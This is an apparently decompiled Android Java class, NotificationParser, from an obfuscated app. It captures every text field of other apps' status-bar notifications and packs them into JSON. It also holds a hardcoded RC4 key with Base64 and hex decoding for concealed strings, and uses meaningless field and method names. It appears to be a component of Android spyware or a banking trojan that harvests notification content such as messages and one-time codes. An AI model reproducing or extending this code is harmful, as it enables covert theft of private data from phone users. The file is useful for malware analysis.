package com.example.mmm.Utils;

import com.example.mmm.*;
import android.app.*;
import android.service.notification.*;
import android.os.*;
import android.annotation.*;
import com.example.mmm.API.*;
import android.util.*;
import org.json.*;

final class NotificationParser
{
    constants linked$;
    utils keeping$;
    private final boolean blowing$;
    private Notification reform$;
    private String seemed$;
    private String marathon$;
    private String reveals$;
    private String picking$;
    private String guest$;
    private String reuters$;
    private String casinos$;
    private String surgical$;
    private String permits$;
    private String mills$;
    
    @TargetApi(19)
    @TargetApi(19)
    NotificationParser(final StatusBarNotification statusBarNotification, final boolean blowing$) {
        super();
        this.linked$ = new constants();
        this.keeping$ = new utils();
        this.blowing$ = blowing$;
        this.reform$ = statusBarNotification.getNotification();
        this.seemed$ = statusBarNotification.getPackageName();
        final Bundle extras = statusBarNotification.getNotification().extras;
        if (!blowing$) {
            return;
        }
        this.marathon$ = _alice(this.reform$.tickerText);
        if (extras != null) {
            statusBarNotification.getNotification();
            this.reveals$ = _alice(extras.getCharSequence("android.title"));
            statusBarNotification.getNotification();
            this.picking$ = _alice(extras.getCharSequence("android.title.big"));
            statusBarNotification.getNotification();
            this.guest$ = _alice(extras.getCharSequence("android.text"));
            statusBarNotification.getNotification();
            this.reuters$ = _alice(extras.getCharSequence("android.bigText"));
            statusBarNotification.getNotification();
            this.casinos$ = _alice(extras.getCharSequence("android.infoText"));
            statusBarNotification.getNotification();
            this.surgical$ = _alice(extras.getCharSequence("android.subText"));
            statusBarNotification.getNotification();
            this.permits$ = _alice(extras.getCharSequence("android.summaryText"));
            statusBarNotification.getNotification();
            final CharSequence[] charSequenceArray = extras.getCharSequenceArray("android.textLines");
            if (charSequenceArray != null) {
                this.mills$ = "";
                for (int length = charSequenceArray.length, i = 0; i < length; ++i) {
                    final CharSequence charSequence = charSequenceArray[i];
                    final StringBuilder sb = new StringBuilder();
                    sb.append(this.mills$);
                    sb.append((Object)charSequence);
                    sb.append("\n");
                    this.mills$ = sb.toString();
                }
                this.mills$ = this.mills$.trim();
            }
        }
    }
    
    private static String _alice(final CharSequence charSequence) {
        if (charSequence == null) {
            return "";
        }
        return charSequence.toString();
    }
    
    private String _knights(String s) {
        s = new String(new ClassRC4("wewiejvtlfqy".getBytes())._nevada(utils.hexStringToByteArray(new String(Base64.decode(s, 0), "UTF-8"))));
        return s;
    }
    
    @Override
    public final String toString() {
        final JSONObject jsonObject = new JSONObject();
        jsonObject.put("packageName", (Object)this.seemed$);
        if (this.blowing$) {
            jsonObject.put("tickerText", (Object)this.marathon$);
            jsonObject.put("title", (Object)this.reveals$);
            jsonObject.put("titleBig", (Object)this.picking$);
            jsonObject.put("text", (Object)this.guest$);
            jsonObject.put("textBig", (Object)this.reuters$);
            jsonObject.put("textInfo", (Object)this.casinos$);
            jsonObject.put("textSub", (Object)this.surgical$);
            jsonObject.put("textSummary", (Object)this.permits$);
            jsonObject.put("textLines", (Object)this.mills$);
            return jsonObject.toString();
        }
        return "";
    }
}
